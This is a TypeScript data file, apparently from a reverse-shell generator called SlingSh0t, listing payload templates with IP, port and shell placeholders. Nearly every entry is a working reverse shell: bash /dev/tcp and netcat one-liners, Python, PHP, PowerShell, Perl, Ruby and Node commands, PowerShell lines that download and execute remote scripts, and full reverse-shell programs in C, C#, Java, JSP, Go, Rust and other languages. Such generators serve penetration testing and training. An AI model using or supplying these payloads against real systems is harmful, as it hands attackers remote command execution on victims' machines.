// To add an entry: append { name, command, os, tags } to REVERSE; a command containing a newline is treated as a full script.
// Placeholders: {ip}, {port}, {shell}.
// `listener` names an entry in LISTENERS (listeners.ts). Entries without one default to nc.
//
// Third-party scripts included verbatim (IP/port replaced by placeholders), one per line, parsed by the Credits test:
// included: PowerShell Reverse TCP | Ivan Šincek | https://github.com/ivan-sincek/powershell-reverse-tcp | MIT
import type { Payload } from './types'
import PS_SINCEK from './vendor/powershell_reverse_tcp.ps1?raw'

const nix: Payload['os'] = ['linux', 'mac']
const all: Payload['os'] = ['linux', 'windows', 'mac']
const win: Payload['os'] = ['windows']

export const REVERSE: Payload[] = [
  // Bash and other shells
  { name: 'Bash /dev/tcp', command: '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1', os: nix, tags: [] },
  { name: 'Bash 196 fd', command: '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196', os: nix, tags: [] },
  { name: 'Bash read line', command: 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done', os: nix, tags: [] },
  { name: 'Bash 5 fd', command: '{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5', os: nix, tags: [] },
  { name: 'Bash UDP', command: '{shell} -i >& /dev/udp/{ip}/{port} 0>&1', os: nix, tags: [], listener: 'nc (UDP)' },
  { name: 'Zsh ztcp', command: 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY', os: nix, tags: [] },

  // nc, ncat and friends
  { name: 'nc mkfifo', command: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f', os: nix, tags: [] },
  { name: 'nc -e', command: 'nc -e {shell} {ip} {port}', os: nix, tags: [] },
  { name: 'nc -c', command: 'nc -c {shell} {ip} {port}', os: nix, tags: [] },
  { name: 'nc.exe -e', command: 'nc.exe -e cmd.exe {ip} {port}', os: win, tags: [] },
  { name: 'BusyBox nc -e', command: 'busybox nc {ip} {port} -e {shell}', os: ['linux'], tags: [] },
  { name: 'ncat -e', command: 'ncat {ip} {port} -e {shell}', os: nix, tags: [] },
  { name: 'ncat.exe -e', command: 'ncat.exe {ip} {port} -e cmd.exe', os: win, tags: [] },
  { name: 'ncat UDP', command: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f', os: nix, tags: [], listener: 'nc (UDP)' },
  { name: 'ncat TLS', command: 'ncat --ssl {ip} {port} -e {shell}', os: nix, tags: [], listener: 'ncat (TLS)' },
  { name: 'sqlite3 nc mkfifo', command: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|sqlite3 /dev/null '.shell nc {ip} {port} >/tmp/f'`, os: ['linux'], tags: [] },
  { name: 'rustcat', command: 'rcat connect -s {shell} {ip} {port}', os: nix, tags: [] },
  { name: 'telnet mkfifo', command: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|telnet {ip} {port} >/tmp/f', os: nix, tags: [] },
  { name: 'telnet mktemp fifo', command: 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF', os: nix, tags: [] },
  { name: 'socat', command: 'socat TCP:{ip}:{port} EXEC:{shell}', os: nix, tags: [] },
  { name: 'socat TTY', command: 'socat TCP:{ip}:{port} EXEC:"{shell}",pty,stderr,setsid,sigint,sane', os: nix, tags: ['tty'], listener: 'socat (TTY)' },
  { name: 'OpenSSL', command: 'mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s', os: nix, tags: [], listener: 'openssl' },
  { name: 'Awk', command: `awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`, os: ['linux'], tags: [] },

  // Python
  { name: 'Python2', command: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{shell}","-i"])'`, os: nix, tags: [] },
  { name: 'Python2 pty', command: `python -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("{shell}")'`, os: nix, tags: ['tty'] },
  { name: 'Python3', command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{shell}","-i"])'`, os: nix, tags: [] },
  { name: 'Python3 pty', command: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("{shell}")'`, os: nix, tags: ['tty'] },
  { name: 'Python3 shortest', command: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`, os: nix, tags: ['tty'] },
  { name: 'Python3 Windows', command: `python.exe -c "import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));[s.send((lambda r:r.stdout+r.stderr)(subprocess.run(s.recv(4096).decode(),shell=True,capture_output=True))) for _ in iter(int,1)]"`, os: win, tags: [] },

  // PHP
  { name: 'PHP exec', command: `php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'`, os: nix, tags: [] },
  { name: 'PHP shell_exec', command: `php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'`, os: nix, tags: [] },
  { name: 'PHP system', command: `php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'`, os: nix, tags: [] },
  { name: 'PHP passthru', command: `php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'`, os: nix, tags: [] },
  { name: 'PHP backtick', command: `php -r '$sock=fsockopen("{ip}",{port});\`{shell} <&3 >&3 2>&3\`;'`, os: nix, tags: [] },
  { name: 'PHP popen', command: `php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'`, os: nix, tags: [] },
  { name: 'PHP proc_open', command: `php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`, os: nix, tags: [] },
  { name: 'PHP cmd pipe', command: `php -r '$s=fsockopen("{ip}",{port});while(!feof($s)){fwrite($s,shell_exec(fgets($s)));}'`, os: nix, tags: [] },

  // PowerShell
  { name: 'PowerShell #1', command: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d | Out-String);$t=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($t,0,$t.Length)};$c.Close()"`, os: win, tags: [] },
  { name: 'PowerShell #2 stderr', command: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$t=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($t,0,$t.Length)};$c.Close()"`, os: win, tags: [] },
  { name: 'PowerShell #3 TLS', command: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$ssl=New-Object Net.Security.SslStream($c.GetStream(),$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$ssl.AuthenticateAsClient('x');[byte[]]$b=0..65535|%{0};while(($i=$ssl.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$t=([text.encoding]::ASCII).GetBytes($r+'PS> ');$ssl.Write($t,0,$t.Length)};$c.Close()"`, os: win, tags: [], listener: 'ncat (TLS)' },
  { name: 'PowerShell #1 (Base64)', command: '', os: win, tags: [] },
  { name: 'PowerShell #2 (Base64)', command: '', os: win, tags: [] },
  { name: 'PowerShell ConPtyShell', command: `IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}`, os: win, tags: ['tty'], listener: 'windows ConPty' },
  { name: 'PowerShell powercat', command: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {ip} -p {port} -e cmd"`, os: win, tags: [], listener: 'powercat' },

  // Perl and Ruby
  { name: 'Perl', command: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`, os: nix, tags: [] },
  { name: 'Perl no sh', command: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, os: nix, tags: [] },
  { name: 'Perl Windows', command: `perl -MIO -e "$c=new IO::Socket::INET(PeerAddr,'{ip}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"`, os: win, tags: [] },
  { name: 'Ruby', command: `ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`, os: nix, tags: [] },
  { name: 'Ruby no sh', command: `ruby -rsocket -e'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`, os: nix, tags: [] },
  { name: 'Ruby Windows', command: `ruby -rsocket -e "c=TCPSocket.new('{ip}','{port}');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"`, os: win, tags: [] },

  // Other one-liners
  { name: 'Java jshell', command: `echo 'Runtime.getRuntime().exec(new String[]{"{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"});' | jshell -`, os: nix, tags: [] },
  { name: 'Java two-stage', command: `echo 'public class R{public static void main(String[] a)throws Exception{new ProcessBuilder("{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done").start().waitFor();}}' > /tmp/R.java && java /tmp/R.java`, os: nix, tags: [] },
  { name: 'curl telnet', command: `C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null`, os: nix, tags: [] },
  { name: 'Node.js -e', command: `node -e 'require("child_process").exec("nc -e {shell} {ip} {port}")'`, os: nix, tags: [] },
  { name: 'Node.js net', command: `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("{shell}",[]);var c=new net.Socket();c.connect({port},"{ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})();'`, os: nix, tags: [] },
  { name: 'Go run', command: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`, os: nix, tags: [] },
  { name: 'Lua', command: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');"`, os: nix, tags: [] },
  { name: 'Lua 5.1', command: `lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`, os: nix, tags: [] },
  { name: 'Crystal eval', command: `crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`, os: nix, tags: [] },
  { name: 'Groovy -e', command: `groovy -e 'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();'`, os: nix, tags: [] },

  // Full scripts: save, upload, run. SlingSh0t originals unless marked otherwise.
  // source: https://github.com/ivan-sincek/powershell-reverse-tcp, MIT (IP/port replaced by placeholders)
  { name: 'PowerShell Ivan Sincek', command: PS_SINCEK, os: win, tags: [] },
  {
    name: 'PHP proc_open script',
    command: `<?php
// SlingSh0t reverse shell: proc_open with the socket as stdin/stdout/stderr.
set_time_limit(0);
$sock = fsockopen('{ip}', {port}, $errno, $errstr, 30);
if (!$sock) { exit("$errstr ($errno)"); }
$spec = array(0 => $sock, 1 => $sock, 2 => $sock);
$proc = proc_open('{shell} -i', $spec, $pipes);
if (is_resource($proc)) { proc_close($proc); }
fclose($sock);
?>`,
    os: nix, tags: [],
  },
  {
    name: 'Python3 pty script',
    command: `#!/usr/bin/env python3
# SlingSh0t reverse shell: socket + pty, reconnects every 5 s until the listener is up.
import os, pty, socket, time
while True:
    try:
        s = socket.socket()
        s.connect(("{ip}", {port}))
        break
    except OSError:
        time.sleep(5)
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
os.putenv("TERM", "xterm")
pty.spawn("{shell}")`,
    os: nix, tags: ['tty'],
  },
  {
    name: 'PowerShell script stderr',
    command: `# SlingSh0t reverse shell: TcpClient loop, stderr merged into the stream.
$client = New-Object Net.Sockets.TcpClient('{ip}', {port})
$stream = $client.GetStream()
$writer = New-Object IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object byte[] 65536
$writer.Write("PS " + (Get-Location).Path + "> ")
while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $cmd = [Text.Encoding]::ASCII.GetString($buffer, 0, $read).Trim()
    if ($cmd -eq 'exit') { break }
    $out = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_ | Out-String }
    $writer.Write($out + "PS " + (Get-Location).Path + "> ")
}
$client.Close()`,
    os: win, tags: [],
  },
  {
    name: 'C',
    command: `// SlingSh0t reverse shell: gcc shell.c -o shell
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void) {
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons({port}) };
    sa.sin_addr.s_addr = inet_addr("{ip}");
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&sa, sizeof sa) != 0) return 1;
    for (int fd = 0; fd < 3; fd++) dup2(s, fd);
    execvp("{shell}", (char *[]){"{shell}", "-i", NULL});
    return 0;
}`,
    os: nix, tags: [],
  },
  {
    name: 'C Windows',
    command: `// SlingSh0t reverse shell for Windows: x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

int main(void) {
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons({port}) };
    sa.sin_addr.s_addr = inet_addr("{ip}");
    if (WSAConnect(s, (SOCKADDR *)&sa, sizeof sa, NULL, NULL, NULL, NULL) != 0) return 1;
    STARTUPINFO si = { .cb = sizeof si, .dwFlags = STARTF_USESTDHANDLES, .hStdInput = (HANDLE)s, .hStdOutput = (HANDLE)s, .hStdError = (HANDLE)s };
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}`,
    os: win, tags: [],
  },
  {
    name: 'C# TcpClient',
    command: `// SlingSh0t reverse shell: csc shell.cs
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

class Shell {
    static void Main() {
        using (var client = new TcpClient("{ip}", {port}))
        using (var stream = client.GetStream())
        using (var reader = new StreamReader(stream))
        using (var writer = new StreamWriter(stream) { AutoFlush = true }) {
            var psi = new ProcessStartInfo("cmd.exe") { RedirectStandardInput = true, RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true };
            var p = Process.Start(psi);
            p.OutputDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
            p.ErrorDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();
            string line;
            while ((line = reader.ReadLine()) != null) p.StandardInput.WriteLine(line);
            p.Kill();
        }
    }
}`,
    os: win, tags: [],
  },
  {
    name: 'C# Linux',
    command: `// SlingSh0t reverse shell for .NET on Linux/macOS: dotnet run
using System.Diagnostics;
using System.Net.Sockets;

var client = new TcpClient("{ip}", {port});
var stream = client.GetStream();
var psi = new ProcessStartInfo("{shell}", "-i") { RedirectStandardInput = true, RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
var p = Process.Start(psi)!;
var pump = async (System.IO.Stream from, System.IO.Stream to) => { await from.CopyToAsync(to); };
_ = pump(p.StandardOutput.BaseStream, stream);
_ = pump(p.StandardError.BaseStream, stream);
await stream.CopyToAsync(p.StandardInput.BaseStream);
p.Kill();`,
    os: nix, tags: [],
  },
  {
    name: 'JSP',
    command: `<%@ page import="java.io.*,java.net.*" %><%
// SlingSh0t reverse shell: drop on the web root and request the page.
Process p = new ProcessBuilder("{shell}", "-i").redirectErrorStream(true).start();
Socket s = new Socket("{ip}", {port});
InputStream pi = p.getInputStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
  while (pi.available() > 0) so.write(pi.read());
  while (si.available() > 0) po.write(si.read());
  so.flush(); po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } catch (Exception e) { }
}
p.destroy(); s.close();
%>`,
    os: all, tags: [],
  },
  {
    name: 'Java',
    command: `// SlingSh0t reverse shell: javac Shell.java && java Shell
import java.io.*;
import java.net.Socket;

public class Shell {
    public static void main(String[] args) throws Exception {
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe"} : new String[]{"{shell}", "-i"};
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        try (Socket s = new Socket("{ip}", {port})) {
            InputStream pi = p.getInputStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (si.available() > 0) po.write(si.read());
                so.flush(); po.flush();
                Thread.sleep(50);
                try { p.exitValue(); break; } catch (IllegalThreadStateException e) { }
            }
        }
        p.destroy();
    }
}`,
    os: all, tags: [],
  },
  {
    name: 'Go',
    command: `// SlingSh0t reverse shell: go build shell.go
package main

import (
	"net"
	"os/exec"
)

func main() {
	c, err := net.Dial("tcp", "{ip}:{port}")
	if err != nil {
		return
	}
	cmd := exec.Command("{shell}", "-i")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
}`,
    os: nix, tags: [],
  },
  {
    name: 'Rust',
    command: `// SlingSh0t reverse shell: rustc shell.rs
use std::net::TcpStream;
use std::os::fd::OwnedFd;
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("{ip}:{port}").unwrap();
    let dup = || Stdio::from(OwnedFd::from(s.try_clone().unwrap()));
    Command::new("{shell}").arg("-i").stdin(dup()).stdout(dup()).stderr(dup()).spawn().unwrap().wait().unwrap();
}`,
    os: nix, tags: [],
  },
  {
    name: 'Node.js script',
    command: `// SlingSh0t reverse shell: node shell.js
const net = require('net')
const { spawn } = require('child_process')
const c = net.connect({port}, '{ip}', () => {
  const sh = spawn('{shell}', ['-i'])
  c.pipe(sh.stdin)
  sh.stdout.pipe(c)
  sh.stderr.pipe(c)
  sh.on('exit', () => c.end())
})
c.on('error', () => process.exit(1))`,
    os: nix, tags: [],
  },
  {
    name: 'Dart',
    command: `// SlingSh0t reverse shell: dart shell.dart
import 'dart:io';

main() async {
  var socket = await Socket.connect('{ip}', {port});
  var process = await Process.start('{shell}', ['-i']);
  process.stdout.listen(socket.add);
  process.stderr.listen(socket.add);
  socket.listen((data) => process.stdin.add(data), onDone: () => process.kill());
  await process.exitCode;
  socket.destroy();
}`,
    os: nix, tags: [],
  },
  {
    name: 'Groovy',
    command: `// SlingSh0t reverse shell: groovy shell.groovy
String host = "{ip}"
int port = {port}
Process p = new ProcessBuilder("{shell}", "-i").redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.inputStream, si = s.inputStream
OutputStream po = p.outputStream, so = s.outputStream
while (!s.closed) {
  while (pi.available() > 0) so.write(pi.read())
  while (si.available() > 0) po.write(si.read())
  so.flush(); po.flush()
  Thread.sleep(50)
  try { p.exitValue(); break } catch (Exception e) { }
}
p.destroy(); s.close()`,
    os: all, tags: [],
  },
  {
    name: 'Haskell',
    command: `-- SlingSh0t reverse shell: ghc shell.hs (needs the network package)
module Main where
import Network.Socket
import System.Process
import System.IO

main :: IO ()
main = do
  addr : _ <- getAddrInfo (Just defaultHints { addrSocketType = Stream }) (Just "{ip}") (Just "{port}")
  sock <- socket (addrFamily addr) Stream defaultProtocol
  connect sock (addrAddress addr)
  h <- socketToHandle sock ReadWriteMode
  (_, _, _, p) <- createProcess (proc "{shell}" ["-i"]) { std_in = UseHandle h, std_out = UseHandle h, std_err = UseHandle h }
  _ <- waitForProcess p
  hClose h`,
    os: nix, tags: [],
  },
]
